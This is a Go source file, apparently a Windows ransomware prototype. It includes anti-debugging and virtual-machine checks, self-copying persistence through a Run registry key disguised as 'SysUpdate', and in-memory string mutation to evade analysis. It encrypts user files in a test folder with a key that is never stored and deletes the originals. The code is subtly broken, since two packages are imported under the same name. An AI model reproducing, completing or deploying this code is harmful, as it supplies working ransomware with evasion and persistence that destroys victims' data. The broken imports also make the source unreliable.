package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/fs"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func main() {
	rand.Seed(time.Now().UnixNano())

	if antiDebug() {
		fmt.Println("[!] Debugger detected, exiting.")
		return
	}

	if isVirtualMachine() {
		fmt.Println("[!] VM detected, exiting.")
		return
	}

	err := setupPersistence()
	if err != nil {
		log.Println("Error setting persistence:", err)
	}

	mutateStringsInMemory()

	targetDir := `C:\TestEncrypt`
	key := make([]byte, 32)
	_, err = rand.Read(key)
	if err != nil {
		log.Fatal(err)
	}
	err = encryptDirectory(targetDir, key)
	if err != nil {
		log.Println("Error encrypting directory:", err)
	}

	fmt.Println("[+] Finished")
}

func antiDebug() bool {
	if isDebuggerPresent() {
		return true
	}
	if checkNtQueryInformationProcess() {
		return true
	}
	if checkTiming() {
		return true
	}
	if checkRemoteDebuggerPresent() {
		return true
	}
	return false
}

func isDebuggerPresent() bool {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	isDebuggerPresentProc := kernel32.NewProc("IsDebuggerPresent")
	ret, _, _ := isDebuggerPresentProc.Call()
	return ret != 0
}

// NtQueryInformationProcess para ProcessDebugPort y ProcessDebugObjectHandle
func checkNtQueryInformationProcess() bool {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	procNtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	var debugPort uintptr
	var debugObjectHandle uintptr
	var returnLength uintptr

	hProcess := windows.CurrentProcess()

	// ProcessDebugPort = 7
	status, _, _ := procNtQueryInformationProcess.Call(uintptr(hProcess), 7, uintptr(unsafe.Pointer(&debugPort)), unsafe.Sizeof(debugPort), uintptr(unsafe.Pointer(&returnLength)))
	if status != 0 || debugPort != 0 {
		return true
	}
	// ProcessDebugObjectHandle = 30
	status, _, _ = procNtQueryInformationProcess.Call(uintptr(hProcess), 30, uintptr(unsafe.Pointer(&debugObjectHandle)), unsafe.Sizeof(debugObjectHandle), uintptr(unsafe.Pointer(&returnLength)))
	if status != 0 || debugObjectHandle != 0 {
		return true
	}
	return false
}

func checkTiming() bool {
	start := time.Now()
	time.Sleep(100 * time.Millisecond)
	elapsed := time.Since(start)
	if elapsed < 100*time.Millisecond {
		return true
	}
	return false
}

func checkRemoteDebuggerPresent() bool {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	checkRemoteDebuggerPresentProc := kernel32.NewProc("CheckRemoteDebuggerPresent")

	hProcess, err := windows.GetCurrentProcess()
	if err != nil {
		return false
	}

	var isRemoteDebuggerPresent int32
	ret, _, _ := checkRemoteDebuggerPresentProc.Call(uintptr(hProcess), uintptr(unsafe.Pointer(&isRemoteDebuggerPresent)))
	if ret == 0 {
		return false
	}
	return isRemoteDebuggerPresent != 0
}

func setupPersistence() error {
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return fmt.Errorf("APPDATA not found")
	}
	targetPath := filepath.Join(appdata, "sys32.exe")

	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
		input, err := ioutil.ReadFile(exePath)
		if err != nil {
			return err
		}
		err = ioutil.WriteFile(targetPath, input, 0644)
		if err != nil {
			return err
		}
	}

	k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer k.Close()

	return k.SetStringValue("SysUpdate", targetPath)
}

func isVirtualMachine() bool {
	cpus := runtime.NumCPU()
	if cpus <= 2 {
		return true
	}

	var memStatus windows.MEMORYSTATUSEX
	memStatus.Length = uint32(unsafe.Sizeof(memStatus))
	err := windows.GlobalMemoryStatusEx(&memStatus)
	if err != nil {
		return false
	}
	// menos de 2GB RAM
	if memStatus.TotalPhys < 2*1024*1024*1024 {
		return true
	}
	return false
}

func mutateStringsInMemory() {
	hModule := windows.Handle(0)
	err := windows.GetModuleHandleEx(0, nil, &hModule)
	if err != nil || hModule == 0 {
		return
	}

	var modInfo windows.ModuleInfo
	err = windows.GetModuleInformation(windows.CurrentProcess(), hModule, &modInfo, uint32(unsafe.Sizeof(modInfo)))
	if err != nil {
		return
	}

	base := uintptr(modInfo.BaseOfDll)
	size := uintptr(modInfo.SizeOfImage)

	mem := unsafe.Slice((*byte)(unsafe.Pointer(base)), size)

	for i := uintptr(0); i < size-5; i++ {
		if isPrintable(mem[i]) && isPrintable(mem[i+1]) && isPrintable(mem[i+2]) && isPrintable(mem[i+3]) {
			length := 0
			for j := i; j < size && length < 50; j++ {
				if !isPrintable(mem[j]) || mem[j] == 0 {
					break
				}
				length++
			}
			if length > 4 {
				idx := rand.Intn(length)
				// solo mutar letras
				c := mem[i+uintptr(idx)]
				if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') {
					newChar := byte('a' + rand.Intn(26))
					if c >= 'A' && c <= 'Z' {
						newChar = byte(strings.ToUpper(string(newChar))[0])
					}

					var oldProtect uint32
					addr := base + i + uintptr(idx)
					windows.VirtualProtect(addr, 1, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
					mem[i+uintptr(idx)] = newChar
					windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
				}
				i += uintptr(length) // saltar cadena para evitar mutar varias veces
			}
		}
	}
}

func isPrintable(b byte) bool {
	return b >= 32 && b <= 126
}

// AES-CBC + PKCS7 (simplificado)
func encryptFile(filename string, key []byte) error {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return err
	}

	padded := pkcs7Pad(data, aes.BlockSize)
	encrypted := make([]byte, len(padded))

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(encrypted, padded)

	encryptedData := append(iv, encrypted...)

	err = ioutil.WriteFile(filename+".locked", encryptedData, 0644)
	if err != nil {
		return err
	}
	return os.Remove(filename)
}

func pkcs7Pad(data []byte, blockSize int) []byte {
	padLen := blockSize - (len(data) % blockSize)
	padding := bytes.Repeat([]byte{byte(padLen)}, padLen)
	return append(data, padding...)
}

func encryptDirectory(root string, key []byte) error {
	targetExts := []string{".docx", ".pdf", ".xls", ".ppt", ".jpg", ".png", ".mp4", ".sql", ".cpp", ".py"}

	return filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}
		ext := strings.ToLower(filepath.Ext(path))
		for _, t := range targetExts {
			if ext == t {
				err := encryptFile(path, key)
				if err != nil {
					log.Println("Error encrypting file:", path, err)
				}
				break
			}
		}
		return nil
	})
}
